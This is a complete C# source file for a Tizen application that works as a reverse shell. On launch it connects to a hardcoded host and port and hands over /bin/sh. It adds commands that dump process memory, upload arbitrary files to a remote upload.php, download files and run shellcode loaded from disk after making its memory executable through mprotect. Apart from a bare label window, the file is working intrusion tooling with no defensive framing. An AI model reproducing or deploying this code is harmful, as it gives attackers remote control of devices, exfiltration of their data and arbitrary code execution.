using BinaryTools.Elf;
using BinaryTools.Elf.Io;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using Tizen.NUI;
using Tizen.NUI.BaseComponents;

namespace ReverseShellTz5
{
    class Program : NUIApplication
    {
        private TextLabel text;
        private StreamWriter streamWriter;
        private string rhost = "192.168.0.75";
        private int rport = 11000;
        private string ruploadhost = "192.168.0.75";
        private int ruploadport = 80;

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        internal delegate int _mprotect(IntPtr addr, Int32 len, UInt32 prot);
        private static _mprotect mprotect;
        private const UInt32 PROT_WRITE = 0x2;   /* Page can be written.  */
        private const UInt32 PROT_EXEC = 0x4;    /* Page can be executed.  */

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        internal delegate int _sysconf(Int32 sysconfName);
        private static _sysconf sysconf;
        private const Int32 _SC_PAGESIZE = 30;
        private static Int32 PAGE_SIZE;

        private IntPtr GetPageBaseAddress(IntPtr p)
        {
            return (IntPtr)((Int32)p & ~(PAGE_SIZE - 1));
        }

        private void MakeMemoryExecutable(IntPtr pagePtr)
        {
            var mprotectResult = mprotect(pagePtr, PAGE_SIZE, PROT_EXEC | PROT_WRITE);

            if (mprotectResult != 0)
            {
                println(string.Format("Error: mprotect failed to make page at 0x{0} " +
                    "address executable! Result: {1}", mprotectResult));
            }
        }

        private delegate int ShellcodeFuncPrototype();
        private uint get_proc_addr_offs(string module, string func)
        {
            var stream = new FileStream(module, FileMode.Open, FileAccess.Read);
            var reader = new EndianBinaryReader(stream, EndianBitConverter.NativeEndianness);
            ElfFile elfFile = ElfFile.ReadElfFile(reader);

            ElfSegment loadSegment = elfFile.Segments.First(x => x.Type == ElfSegmentType.Load);
            ElfSymbolTable symbolTable = (ElfSymbolTable)elfFile.Sections.First(x => x.Name == ".dynsym");
            var symbolTableEntry = symbolTable.First(x => x.Name == func);

            println(string.Format("{0}: 0x{1:X}", func, (uint)(symbolTableEntry.Value - loadSegment.PhysicalAddress)));

            return (uint)(symbolTableEntry.Value - loadSegment.PhysicalAddress);
        }

        unsafe private int ExecShellcode(string filename)
        {
            using (Process myProcess = Process.GetCurrentProcess())
            {
                foreach (ProcessModule module in myProcess.Modules)
                {
                    if (module.ModuleName.StartsWith("libc-"))
                    {
                        mprotect = (_mprotect)Marshal.GetDelegateForFunctionPointer(IntPtr.Add(module.BaseAddress, (int)get_proc_addr_offs(module.FileName, "mprotect")), typeof(_mprotect));
                        sysconf = (_sysconf)Marshal.GetDelegateForFunctionPointer(IntPtr.Add(module.BaseAddress, (int)get_proc_addr_offs(module.FileName, "sysconf")), typeof(_sysconf));

                        println(string.Format("base: 0x{0:X}", module.BaseAddress.ToInt32()));
                    }                    
                }
            }

            PAGE_SIZE = sysconf(_SC_PAGESIZE);
            // read the shellcode bin data from file
            Byte[] sc = System.IO.File.ReadAllBytes(filename);

            // Prevent garbage collector from moving the shellcode byte array
            GCHandle pinnedByteArray = GCHandle.Alloc(sc, GCHandleType.Pinned);

            // Get handle for shellcode address and address of the page it is located in
            IntPtr shellcodePtr = pinnedByteArray.AddrOfPinnedObject();
            IntPtr shellcodePagePtr = GetPageBaseAddress(shellcodePtr);
            Int32 shellcodeOffset = (Int32)shellcodePtr - (Int32)shellcodePagePtr;
            Int32 shellcodeLen = sc.GetLength(0);

            // Make shellcode memory executable
            MakeMemoryExecutable(shellcodePagePtr);

            // Check if shellcode spans across more than 1 page; make all extra pages
            // executable too
            Int32 pageCounter = 1;
            while (shellcodeOffset + shellcodeLen > PAGE_SIZE)
            {
                shellcodePagePtr = GetPageBaseAddress(shellcodePtr + pageCounter * PAGE_SIZE);
                pageCounter++;
                shellcodeLen -= PAGE_SIZE;

                MakeMemoryExecutable(shellcodePagePtr);
            }

            // Make shellcode callable by converting pointer to delegate
            ShellcodeFuncPrototype shellcode_mainfunc = (ShellcodeFuncPrototype)Marshal.GetDelegateForFunctionPointer(shellcodePtr, typeof(ShellcodeFuncPrototype));
                        
            var r = shellcode_mainfunc(); // Execute shellcode

            pinnedByteArray.Free();

            return r;
        }

        protected override void OnCreate()
        {
            base.OnCreate();
            Initialize();

            StartTCPServer(rhost, rport);
        }

        private void println(string msg)
        {
            text.Text += msg + "|";
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { println(err.Message); }
            }
        }

        private void StartTCPServer(string host, int port)
        {
            try
            {
                using (TcpClient client = new TcpClient(host, port))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            streamWriter.WriteLine("reverse shell v1.0.2 - MrB 2020");
                            streamWriter.WriteLine("extra commands: dump modules, dump mem <hexstartaddr>-<hexendaddr>, get <filename>, put <remoteurl> <localfilename>, exec <sc.bin>, cat <filename>");
                            streamWriter.Write(">");
                            streamWriter.Flush();

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "/bin/sh";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();

                            //"{ while IFS = '' read - rd '' _bcat_; do printf '%s\0' "${ _bcat_}"; done; printf '%s' "${ _bcat_}"; unset _bcat_; } < ''
                            //p.StandardInput.WriteLine("alias cat=\"{ while IFS = '' read - rd '' _bcat_; do printf '%s\0' \"${ _bcat_}\"; done; printf '%s' \"${ _bcat_}\"; unset _bcat_; } < \"");

                            p.BeginOutputReadLine();

                            while (true)
                            {
                                string line = rdr.ReadLine();

                                if (line.StartsWith("dump mem "))
                                {
                                    string[] cmd = line.Split("dump mem ");

                                    if (cmd.Length > 1 && !String.IsNullOrEmpty(cmd[1]))
                                    {
                                        string[] args = cmd[1].Split("-");

                                        if (args.Length > 1 && !String.IsNullOrEmpty(args[0]) && !String.IsNullOrEmpty(args[1]))
                                        {
                                            int start = Convert.ToInt32(args[0], 16);
                                            int end = Convert.ToInt32(args[1], 16);

                                            streamWriter.WriteLine(string.Format("dumping 0x{0} ({1} bytes)...", start.ToString("X"), end - start));
                                            streamWriter.Flush();

                                            using (FileStream fstream = new FileStream(@"/tmp/memdump-" + start.ToString("X") + ".bin", FileMode.Create))
                                            {
                                                using (BinaryWriter writer = new BinaryWriter(fstream))
                                                {
                                                    unsafe
                                                    {
                                                        for (int i = 0; i < end - start; i++)
                                                            writer.Write((byte)*(uint*)(start + i));
                                                    }
                                                }
                                            }

                                            streamWriter.WriteLine(@"/tmp/memdump-" + start.ToString("X") + ".bin created");
                                            streamWriter.Flush();
                                        }
                                    }
                                }
                                else if (line.StartsWith("dump modules"))
                                {
                                    streamWriter.WriteLine("dumping loaded modules...");
                                    streamWriter.Flush();

                                    using (Process myProcess = Process.GetCurrentProcess())
                                    {
                                        string buffer = "";

                                        foreach (ProcessModule module in myProcess.Modules)
                                            buffer += string.Format("Module: {0} [0x{1}]\n", module.FileName, module.BaseAddress.ToString("x"));

                                        using (FileStream fstream = new FileStream(@"/tmp/modules.txt", FileMode.Create))
                                        {
                                            using (BinaryWriter writer = new BinaryWriter(fstream))
                                            {
                                                writer.Write(buffer);
                                            }
                                        }

                                        streamWriter.WriteLine("/tmp/modules.txt created");
                                        streamWriter.Flush();
                                    }
                                }
                                else if (line.StartsWith("get "))
                                {
                                    string[] cmd = line.Split("get ");

                                    if (cmd.Length > 1 && !String.IsNullOrEmpty(cmd[1]))
                                    {
                                        streamWriter.WriteLine("uploading " + cmd[1] + " to http://" + ruploadhost + ":" + ruploadport + "/upload.php");
                                        streamWriter.Flush();

                                        try
                                        {
                                            using (WebClient wc = new WebClient())
                                            {
                                                wc.UploadFile("http://" + ruploadhost + ":" + ruploadport + "/upload.php", cmd[1]);
                                                //wc.UploadFile("https://myforexbots.com/upload.php", cmd[1]);
                                                streamWriter.WriteLine("file uploaded");
                                                streamWriter.Flush();
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            streamWriter.WriteLine(ex.Message);
                                            streamWriter.Flush();
                                        }
                                    }
                                }
                                else if (line.StartsWith("put "))
                                {
                                    string[] cmd = line.Split(" ");

                                    if (cmd.Length > 2 && !String.IsNullOrEmpty(cmd[1]) && !String.IsNullOrEmpty(cmd[2]))
                                    {
                                        streamWriter.WriteLine("downloading " + cmd[1] + " to " + cmd[2]);
                                        streamWriter.Flush();

                                        try
                                        {
                                            using (WebClient wc = new WebClient())
                                            {
                                                wc.DownloadFile(cmd[1], cmd[2]);
                                                streamWriter.WriteLine("file downloaded");
                                                streamWriter.Flush();
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            streamWriter.WriteLine(ex.Message);
                                            streamWriter.Flush();
                                        }
                                    }
                                }
                                else if (line.StartsWith("exec "))
                                {
                                    string[] cmd = line.Split("exec ");

                                    if (cmd.Length > 1 && !String.IsNullOrEmpty(cmd[1]))
                                    {
                                        streamWriter.WriteLine("executing " + cmd[1]);
                                        streamWriter.Flush();

                                        try
                                        {
                                            string sc = System.IO.Path.GetFullPath(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "/../shared/res/" + cmd[1]);
                                            streamWriter.WriteLine(string.Format("shellcode returned: {0}", ExecShellcode(sc)));

                                            streamWriter.Write(System.IO.File.ReadAllText(@"/tmp/xploit.log"));
                                            streamWriter.Flush();
                                        }
                                        catch (Exception ex)
                                        {
                                            streamWriter.WriteLine(ex.Message);
                                            streamWriter.Flush();
                                        }
                                    }
                                }
                                else if (line.StartsWith("cat "))
                                {
                                    string[] cmd = line.Split("cat ");

                                    if (cmd.Length > 1 && !String.IsNullOrEmpty(cmd[1]))
                                    {
                                        streamWriter.WriteLine(System.IO.File.ReadAllText(cmd[1]));
                                        streamWriter.Flush();
                                    }
                                }
                                else
                                {
                                    strInput.Append(line);
                                    //strInput.Append("\n");
                                    p.StandardInput.WriteLine(strInput);
                                }
                                strInput.Remove(0, strInput.Length);
                                streamWriter.Write(">");
                                streamWriter.Flush();
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                println(ex.Message);
            }
        }

        void Initialize()
        {
            Window.Instance.KeyEvent += OnKeyEvent;

            text = new TextLabel();
            text.HorizontalAlignment = HorizontalAlignment.Begin;
            text.VerticalAlignment = VerticalAlignment.Top;
            text.TextColor = Color.White;
            text.PointSize = 30.0f;
            text.HeightResizePolicy = ResizePolicyType.FillToParent;
            text.WidthResizePolicy = ResizePolicyType.FillToParent;
            Window.Instance.GetDefaultLayer().Add(text);
        }

        public void OnKeyEvent(object sender, Window.KeyEventArgs e)
        {
            if (e.Key.State == Key.StateType.Down && (e.Key.KeyPressedName == "XF86Back" || e.Key.KeyPressedName == "Escape"))
            {
                Exit();
            }
        }

        static void Main(string[] args)
        {
            var app = new Program();
            app.Run(args);
        }
    }
}
